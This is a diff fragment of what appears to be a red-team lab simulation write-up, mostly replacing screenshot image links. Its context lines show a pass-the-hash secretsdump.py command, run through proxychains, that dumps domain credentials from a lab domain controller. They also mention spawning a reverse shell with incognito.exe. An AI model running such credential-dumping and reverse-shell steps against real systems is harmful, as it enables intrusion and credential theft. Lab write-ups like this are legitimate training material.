@@ -421,21 +421,13 @@ Even more information I gathered using the -debug switch
 ```bash
 proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-
-![Screenshot 2023-07-08 at 8.33.03 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac9373c4-a579-4fa7-b974-fa1fdbcd2dc2/Screenshot_2023-07-08_at_8.33.03_PM.png)
-
-![Screenshot 2023-07-08 at 8.33.23 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f238521b-4f01-4400-ac71-f6f0527d68dc/Screenshot_2023-07-08_at_8.33.23_PM.png)
-
-![Screenshot 2023-07-08 at 8.33.46 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bd1a1ca0-d589-4e49-96c3-f3a08a61a7f5/Screenshot_2023-07-08_at_8.33.46_PM.png)
-
-![Screenshot 2023-07-08 at 8.34.51 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1094db34-5b01-4916-b29f-20ef5f8c3559/Screenshot_2023-07-08_at_8.34.51_PM.png)
-
-![Screenshot 2023-07-08 at 8.35.44 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dba01eaa-2f84-4e79-aeba-a517975a8f78/Screenshot_2023-07-08_at_8.35.44_PM.png)
-
-![Screenshot 2023-07-08 at 8.36.17 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a07c7e2c-547d-4d6a-8f5f-fb9dc022b9d6/Screenshot_2023-07-08_at_8.36.17_PM.png)
-
-![Screenshot 2023-07-08 at 8.37.06 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4d0c3fd-7cf5-4690-b5c9-36deed4492e3/Screenshot_2023-07-08_at_8.37.06_PM.png)
-
-![Screenshot 2023-07-08 at 8.37.52 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fad8edf1-1742-4a6c-8593-673c5d87ffef/Screenshot_2023-07-08_at_8.37.52_PM.png)
+![Screenshot 2023-07-08 at 8 33 03 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/28e5d660-16b1-4491-8832-a12dabf62ff9)
+![Screenshot 2023-07-08 at 8 33 23 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aebe1d64-4d6f-4543-aca8-da975d3431c9)
+![Screenshot 2023-07-08 at 8 33 46 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/53a0f654-aa77-4459-acea-137fff5265a4)
+![Screenshot 2023-07-08 at 8 34 51 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/31c97561-e9bf-4b7a-a3f5-d4d787e88423)
+![Screenshot 2023-07-08 at 8 35 44 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5d006205-26cb-495b-b7a2-b60e6bf1ec01)
+![Screenshot 2023-07-08 at 8 36 17 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/93904dd9-550e-4468-8f76-5d20cf148f9d)
+![Screenshot 2023-07-08 at 8 37 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/faf5528a-4cd5-48b8-9a2e-7a57bd22223d)
+![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1702a323-aff8-420e-8bb9-edadb97f5995)
 
 Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.
